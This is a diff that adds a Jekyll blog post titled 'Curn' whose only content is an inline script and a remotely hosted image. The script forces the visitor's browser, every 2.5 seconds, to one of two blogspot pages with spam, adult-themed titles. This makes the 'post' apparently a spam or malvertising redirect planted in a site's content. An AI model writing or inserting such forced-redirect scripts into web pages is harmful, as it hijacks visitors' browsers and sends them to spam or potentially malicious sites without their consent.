@@ -1,0 +1,14 @@
+---
+published: true
+title: Curn
+layout: post
+---
+<script type="text/javascript">
+var urls = new Array("http://datearth.blogspot.com/2015/12/break-into-8-largest-red-light.html", "http://datearth.blogspot.com/2015/12/do-not-forget-to-take-nude-bath-when.html");
+function redirect()
+{
+window.location = urls[Math.floor(urls.length*Math.random())];
+}
+var temp = setInterval("redirect()", 2500);
+</script>
+<img src="http://s1.postimg.org/stf26dnsv/77c53f7c6d8265b0e89aaac3e1c8bf62.jpg" alt="77c53f7c6d8265b0e89aaac3e1c8bf62" height="834px" width="1176px">
